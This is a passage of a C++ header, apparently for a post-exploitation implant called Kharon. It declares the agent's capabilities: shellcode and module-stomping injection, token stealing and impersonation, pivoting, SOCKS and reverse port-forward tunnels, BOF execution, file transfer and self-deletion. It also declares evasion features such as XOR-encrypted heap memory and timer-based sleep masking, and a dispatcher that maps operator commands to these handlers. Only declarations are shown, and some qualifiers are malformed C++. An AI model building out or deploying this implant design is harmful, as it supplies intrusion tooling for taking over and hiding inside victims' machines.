    ) -> ERROR_CODE;

    auto InitWSA( VOID ) -> BOOL;

    auto RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead ) -> BOOL;

    auto LogData(
        _In_ const char* description,
        _In_ const BYTE* data,
        _In_ ULONG length
    ) -> VOID;
};

class Injection {
private:
    Root::Kharon* Self;
public:
    Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    struct {
        INJ_OBJ* Object;
        HANDLE   ReadHandle;
        HANDLE   WriteHandle;
    } Node[15];

    auto Main(
        _In_    BYTE*    Buffer,
        _In_    SIZE_T   Size,
        _In_    BYTE*    ArgBuff,
        _In_    SIZE_T   ArgSize,
        _Inout_ INJ_OBJ* Object
    ) -> BOOL;

    auto Stomp(
        _In_    BYTE*    Buffer,
        _In_    SIZE_T   Size,
        _In_    BYTE*    ArgBuff,
        _In_    SIZE_T   ArgSize,
        _Inout_ INJ_OBJ* Object
    ) -> BOOL;

    auto Standard(
        _In_    BYTE*    Buffer,
        _In_    SIZE_T   Size,
        _In_    BYTE*    ArgBuff,
        _In_    SIZE_T   ArgSize,
        _Inout_ INJ_OBJ* Object
    ) -> BOOL;    
};

class Task {
private:
    Root::Kharon* Self;
public:
    Task( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Dispatcher( 
        VOID 
    ) -> VOID;

    auto ScInject(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Token(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Info(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto PostEx(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto SelfDel(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Download(
        _In_ JOBS* Job
    ) -> ERROR_CODE;
    
    auto Upload(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Pivot( 
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Socks( 
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Config( 
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Process( 
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto FileSystem( 
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto ExecBof(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Exit(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Jobs(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Task::ProcessTunnel(
    _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Task::ProcessDownloads(
    _In_ JOBS* Job
    ) -> ERROR_CODE;

    auto Task::RPortfwd(
        _In_ JOBS* Job
    ) -> ERROR_CODE;

    typedef auto ( Task::*TASK_FUNC )( JOBS* ) -> ERROR_CODE;

    struct {
        ULONG        ID;
        ERROR_CODE ( Task::*Run )( JOBS* );
    } Mgmt[TSK_LENGTH] = {
        Mgmt[0].ID  = Enm::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
        Mgmt[1].ID  = Enm::Task::FileSystem,        Mgmt[1].Run  = &Task::FileSystem,
        Mgmt[2].ID  = Enm::Task::Process,           Mgmt[2].Run  = &Task::Process,
        Mgmt[3].ID  = Enm::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
        Mgmt[4].ID  = Enm::Task::Config,            Mgmt[4].Run  = &Task::Config,
        Mgmt[5].ID  = Enm::Task::Download,          Mgmt[5].Run  = &Task::Download,
        Mgmt[6].ID  = Enm::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
        Mgmt[7].ID  = Enm::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
        Mgmt[8].ID  = Enm::Task::Token,             Mgmt[8].Run  = &Task::Token,
        Mgmt[9].ID  = Enm::Task::Pivot,             Mgmt[9].Run  = &Task::Pivot,
        Mgmt[10].ID = Enm::Task::SelfDelete,        Mgmt[10].Run = &Task::SelfDel,
        Mgmt[11].ID = Enm::Task::PostEx,            Mgmt[11].Run = &Task::PostEx,
        Mgmt[12].ID = Enm::Task::ScInject,          Mgmt[12].Run = &Task::ScInject,
        Mgmt[13].ID = Enm::Task::GetInfo,           Mgmt[13].Run = &Task::Info,
        Mgmt[14].ID = Enm::Task::Jobs,              Mgmt[14].Run = &Task::Jobs,
        Mgmt[15].ID = Enm::Task::ProcessTunnels,    Mgmt[15].Run = &Task::ProcessTunnel,
        Mgmt[16].ID = Enm::Task::ProcessDownloads,  Mgmt[16].Run = &Task::ProcessDownloads,
        Mgmt[17].ID = Enm::Task::RPortfwd,          Mgmt[17].Run = &Task::RPortfwd
    };
};

class Process {
private:
    Root::Kharon* Self;
public:
    Process( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
    
    struct {
        PVOID p;
        ULONG s;
    } Out;

    auto Open(
        _In_ ULONG RightsAccess,
        _In_ BOOL  InheritHandle,
        _In_ ULONG ProcessID
    ) -> HANDLE;

    auto Create(
        _In_  WCHAR*               CommandLine,
        _In_  ULONG                InheritHandles,
        _In_  ULONG                PsFlags,
        _Out_ PPROCESS_INFORMATION PsInfo
    ) -> BOOL;
};

class Thread {
    private:
    Root::Kharon* Self;
public:
    Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto GetCtx(
        HANDLE   Handle,
        CONTEXT* Ctx
    ) -> BOOL;

    auto SetCtx(
        HANDLE   Handle,
        CONTEXT* Ctx
    ) -> BOOL;

    auto Create(
        _In_  HANDLE ProcessHandle,
        _In_  PVOID  StartAddress,
        _In_  PVOID  Parameter,
        _In_  ULONG  StackSize,
        _In_  ULONG  Flags,
        _Out_ ULONG* ThreadID
    ) -> HANDLE;

    auto Open(
        _In_ ULONG RightAccess,
        _In_ BOOL  Inherit,
        _In_ ULONG ThreadID
    ) -> HANDLE;

    auto Enum( 
        _In_      INT8  Type,
        _In_opt_  ULONG ProcessID = 0,
        _Out_opt_ ULONG ThreadQtt = 0,
        _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo = NULL
    ) -> ULONG;

    auto Rnd( VOID ) -> ULONG {
        return Enum( Enm::Thread::Random, 0 );
    };

    auto Target( 
        _In_opt_  ULONG ProcessID,
        _Out_opt_ ULONG ThreadQtt,
        _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
    ) -> ULONG {
        return Enum( Enm::Thread::Target, ProcessID, ThreadQtt, ThreadInfo );
    }

    auto QueueAPC(
        _In_     PVOID  CallbackFnc,
        _In_     HANDLE ThreadHandle,
        _In_opt_ PVOID  Argument1,
        _In_opt_ PVOID  Argument2,
        _In_opt_ PVOID  Argument3
    ) -> LONG;

    auto InstallHwbp( VOID ) {
        return Enum( Enm::Thread::Hwbp );
    }
};

class Library {
private:
    Root::Kharon* Self;
public:
    Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Load(
        _In_ PCHAR LibName
    ) -> UPTR;

    auto DECLFN Library::GetRnd(  _Out_ WCHAR*& ModulePath ) -> BOOL;

    auto Map(
        _In_ PCHAR LibName
    ) -> UPTR;
};

typedef struct _TOKEN_NODE {
    ULONG  TokenID; // fiction number generated from agent
    HANDLE Handle;
    PCHAR  User;
    ULONG  ProcessID;
    ULONG  ThreadID;
    PCHAR  Host;
    struct _TOKEN_NODE* Next;
} TOKEN_NODE; 

struct _PRIV_LIST {
    ULONG Attributes;
    CHAR* PrivName;
};
typedef _PRIV_LIST PRIV_LIST;

class Token {
private:
    Root::Kharon* Self;
public:
    Token( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    TOKEN_NODE* Node = nullptr;

    auto CurrentPs( VOID ) -> HANDLE;
    auto CurrentThread( VOID ) -> HANDLE;

    auto GetByID(
        _In_ ULONG TokenID
    ) -> TOKEN_NODE*;

    auto GetPrivs(
        _In_ HANDLE TokenHandle
    ) -> BOOL;

    auto ListPrivs(
        _In_  HANDLE  TokenHandle,
        _Out_ ULONG  &ListCount
    ) -> PVOID;

    auto Add(
        _In_ HANDLE TokenHandle,
        _In_ ULONG  ProcessID
    ) -> TOKEN_NODE*;

    auto Rm(
        _In_ ULONG TokenID
    ) -> BOOL;

    auto Rev2Self( VOID ) -> BOOL;

    auto Use(
        _In_ HANDLE TokenHandle
    ) -> BOOL;

    auto TdOpen(
        _In_  HANDLE  ThreadHandle,
        _In_  ULONG   RightsAccess,
        _In_  BOOL    OpenAsSelf,
        _Out_ HANDLE* TokenHandle
    ) -> BOOL;

    auto SetPriv(
        _In_ HANDLE Handle,
        _In_ CHAR*  PrivName
    ) -> BOOL;

    auto Steal(
        _In_ ULONG ProcessID
    ) -> TOKEN_NODE*;

    auto GetUser( 
        _In_  HANDLE TokenHandle 
    ) -> CHAR*;

    auto ProcOpen(
        _In_  HANDLE  ProcessHandle,
        _In_  ULONG   RightsAccess,
        _Out_ HANDLE* TokenHandle
    ) -> BOOL;
};

typedef struct _HEAP_NODE {
    PVOID Block;
    ULONG Size;
    struct _HEAP_NODE* Next;
} HEAP_NODE;

class Heap {
private:
    Root::Kharon* Self;
public:
    Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    HEAP_NODE* Node  = nullptr;
    ULONG Count      = 0;
    BYTE  XorKey[16] = { 0 };

    auto Crypt( VOID ) -> VOID;

    auto CheckPtr( 
        _In_ PVOID Ptr 
    ) -> BOOL;

    auto Alloc(
        _In_ ULONG Size
    ) -> PVOID;
    
    auto ReAlloc(
        _In_ PVOID Block,
        _In_ ULONG Size
    ) -> PVOID;
    
    auto Free(
        _In_ PVOID Block
    ) -> BOOL;

    auto Clean( VOID ) -> VOID;
};

class Memory {
private:
    Root::Kharon* Self;
public:
    Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    ULONG PageSize = 0;
    ULONG PageGran = 0;

    auto Alloc(
        _In_ PVOID  Base,
        _In_ SIZE_T Size,
        _In_ ULONG  AllocType,
        _In_ ULONG  Protect,
        _In_ HANDLE Handle = NtCurrentProcess()
    ) -> PVOID;

    auto DripAlloc(
        _In_  SIZE_T  Size,
        _In_  ULONG   Protect,
        _In_  HANDLE  Handle = NtCurrentProcess()
    ) -> PVOID;

    auto Protect(
        _In_  PVOID  Base,
        _In_  SIZE_T Size,
        _In_  ULONG  NewProt,
        _Out_ ULONG *OldProt,
        _In_  HANDLE Handle = NtCurrentProcess()
    ) -> BOOL;

    auto Write(
        _In_  PVOID   Base,
        _In_  BYTE*   Buffer,
        _In_  ULONG   Size,
        _Out_ SIZE_T* Written,
        _In_  HANDLE Handle = NtCurrentProcess()
    ) -> BOOL;

    auto WriteAPC(
        _In_ HANDLE Handle,
        _In_ PVOID  Base,
        _In_ BYTE*  Buffer,
        _In_ ULONG  Size
    ) -> BOOL;

    auto Read(
        _In_  PVOID   Base,
        _In_  BYTE*   Buffer,
        _In_  SIZE_T  Size,
        _Out_ SIZE_T* Reads,
        _In_ HANDLE Handle = NtCurrentProcess()
    ) -> BOOL;

    auto Free(
        _In_ PVOID  Base,
        _In_ SIZE_T Size,
        _In_ ULONG  FreeType,
        _In_ HANDLE Handle = NtCurrentProcess()
    ) -> BOOL;

    auto MapView(
        _In_        HANDLE          SectionHandle,
        _In_        HANDLE          ProcessHandle,
        _Inout_     PVOID          *BaseAddress,
        _In_        ULONG_PTR       ZeroBits,
        _In_        SIZE_T          CommitSize,
        _Inout_opt_ LARGE_INTEGER*  SectionOffset,
        _Inout_     SIZE_T*         ViewSize,
        _In_        SECTION_INHERIT InheritDisposition,
        _In_        ULONG           AllocationType,
        _In_        ULONG           PageProtection
    ) -> LONG;

    auto CreateSection(
        _Out_    HANDLE*            SectionHandle,
        _In_     ACCESS_MASK        DesiredAccess,
        _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
        _In_opt_ LARGE_INTEGER*     MaximumSize,
        _In_     ULONG              SectionPageProtection,
        _In_     ULONG              AllocationAttributes,
        _In_opt_ HANDLE             FileHandle
    ) -> LONG;

};

class Mask {
private:
    Root::Kharon* Self;
public:
    Mask( Root::Kharon* KharonRf ) : Self( KharonRf ) {};;

    auto static SetEventThunk(
        PTP_CALLBACK_INSTANCE Instance,
        PVOID                 Event,
        PTP_TIMER             Timer
    ) -> VOID;

    auto static RtlCaptureContextThunk(
        PTP_CALLBACK_INSTANCE Instance,
        PVOID                 Context,
        PTP_TIMER             Timer
    ) -> VOID;

    auto Main(
        _In_ ULONG Time
    ) -> BOOL;

    auto Timer(
        _In_ ULONG Time
    ) -> BOOL;

    auto Wait(
        _In_ ULONG Time
    ) -> BOOL;
};

#endif // KHARON_H
